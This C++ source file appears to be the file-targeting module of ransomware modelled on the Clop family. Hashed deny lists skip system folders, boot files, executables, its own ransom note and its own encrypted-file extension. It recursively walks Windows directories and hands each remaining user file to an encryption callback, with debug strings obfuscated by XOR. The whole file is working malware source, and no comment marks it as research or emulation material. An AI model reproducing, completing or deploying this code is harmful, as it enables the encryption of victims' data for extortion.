#include "enumeration.hpp"


const std::vector<size_t> DIR_HASHES_DENYLIST{
    size_t{13714783737157586730}, // WINDOWS,
    size_t{16294478268105762133}, // BOOT,
    size_t{11730804203830798700}, // PROGRAM FILES,
    size_t{8243396412140112909}, // PROGRAM FILES (X86),
    size_t{7665649581132404852}, // ALL USERS,
    size_t{13315084447489887237}, // LOCAL SETTINGS,
    size_t{1204314178630210611}, // PROGRAMDATA,
    size_t{16064871758815058394}, // TOR BROWSER,
    size_t{7383438560970952628}, // APPDATA,
    size_t{4193804704887704147}, // CHROME,
    size_t{11476543902790733284}, // SYSTEM VOLUME INFORMATION,
    size_t{2312630858471275981}, // PERFLOGS,
    size_t{7303442476068177007}, // MOZILLA,
    size_t{11905298456031223380}, // OPERA,
    size_t{8743007604629531910}, // GOOGLE,
    size_t{4753805489981233548}, // WINDOWS NT,
    size_t{6173898670785893543}, // MICROSOFT,
    size_t{11941603281617576375}, // INTEL,
    size_t{15273881186175295015}, // APPLICATION DATA,
    size_t{10965301105541186043}, // INTERNET EXPLORER,
    size_t{8175513480046903099}, // COMMON FILES,
    size_t{18104568460970468403}, // $RECYCLE.BIN,
    size_t{7665649581132404852}, // ALL USERS,
    size_t{10119686291615816562}, // $WINDOWS.~BT,
    size_t{10132153653965641166}, // $WINDOWS.~WS,
    size_t{10224700175182279897}, // WINDOWS JOURNAL,
    size_t{6189936748934446479}, // MSBUILD,

};
const std::vector<size_t> FILENAME_HASHES_DENYLIST{
    size_t{3092191892292380212}, // README!_CI0P!.TXT
    size_t{10407296455843350975}, // NTDLR
    size_t{1538322473730130449}, // BOOT.INI
    size_t{12269482204212480736}, // NTUSER.INI
    size_t{13239991226646221946}, // AUTOEXEC.BAT
    size_t{14499418621585921787}, // NTDETECT.COM
    size_t{10886393713929239935}, // DESKTOP.INI
    size_t{6811725144827512882}, // AUTORUN.INF
    size_t{4166019933784284195}, // NTUSER.DAT
    size_t{14168656302015094734}, // ICONCACHE.DB
    size_t{17095952390706610214}, // BOOTSECT.BAK
    size_t{10005438408524253386}, // NTUSER.DATA.LOG
    size_t{1950766592640533800}, // THUMBS.DB
};
const std::vector<size_t> EXT_HASHES_DENYLIST{
    size_t{1172660210470315094}, // .C_I0P
    size_t{6463401760799950959}, // .DLL
    size_t{5950200310428629515}, // .EXE
    size_t{13208723076742731098}, // .SYS
    size_t{12213831082161123769}, // .OCX
    size_t{11470108222887943712}, // .LNK
};


namespace Enumeration {

    bool CheckValidity(std::string value, std::vector<size_t> denyList, std::string message) {
        bool skip = Core::CompareHash(value, denyList);
        if (skip) {
            XorLogger::LogDebug(message + value);
        }
        return !skip;
    }

    bool CheckValidDirectory(std::string directory) {
        return CheckValidity(directory, DIR_HASHES_DENYLIST, "Ignoring blocklisted directory: ");
    }

    bool CheckValidFilename(std::string filename) {
        return CheckValidity(filename, FILENAME_HASHES_DENYLIST, "Ignoring blocklisted filename: ");
    }

    bool CheckValidExtension(std::string extension) {
        return CheckValidity(extension, EXT_HASHES_DENYLIST, "Ignoring file with blocklisted extension: ");
    }

    void EnumerateFiles(std::string path, std::function<bool (const std::string)> encrypt) {
        std::vector<std::string> files;

        std::filesystem::path fsPath(path);
        if (path.back() != '\\') {
            path += '\\';
        }
        std::string enumPath = path + "*";
        XorLogger::LogDebug(XOR_LIT("Enumerating: ") + enumPath);
        try {
            if (!std::filesystem::is_symlink(fsPath)) {
                if (std::filesystem::is_directory(fsPath)) {
                    WIN32_FIND_DATA findData;
                    HANDLE hFind = FindFirstFile(enumPath.c_str(), &findData);

                    if (hFind != INVALID_HANDLE_VALUE) {
                        do {
                            char* filename = findData.cFileName;
                            // Skip "." and ".."
                            if (std::string(filename).compare(".") && std::string(filename).compare("..")) {
                                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                                    if (CheckValidDirectory(filename)) {
                                        // Recurse into directories
                                        EnumerateFiles(path + filename + "\\", encrypt);
                                    }
                                }
                                else {
                                    std::filesystem::path filenamePath(path + filename);
                                    auto extension = filenamePath.extension();
                                    try {
                                        if (!std::filesystem::is_symlink(path + filename) && CheckValidFilename(filename) && CheckValidExtension(extension.string())) {
                                            encrypt(path + filename);
                                        }
                                    }
                                    catch (const std::filesystem::filesystem_error& e) {
                                        XorLogger::LogError(XOR_LIT("Error checking symlink [passing on file]: ") + std::string{ e.what() });
                                    }

                                }
                            }
                        } while (FindNextFile(hFind, &findData) != 0);

                        FindClose(hFind);
                    }
                }
                else {
                    std::filesystem::path filenamePath(fsPath.string());
                    auto extension = filenamePath.extension();
                    if (CheckValidFilename(fsPath.string()) && CheckValidExtension(extension.string()))
                        encrypt(fsPath.string());
                }
            }
            else {
                XorLogger::LogDebug(XOR_LIT("Path: '") + fsPath.string() + XOR_LIT("' is a symlink and will be ignored."));
            }
        }
        catch (const std::filesystem::filesystem_error& e) {
            XorLogger::LogError(XOR_LIT("Error checking symlink [passing on file]: ") + std::string{ e.what() });
        }
    }
}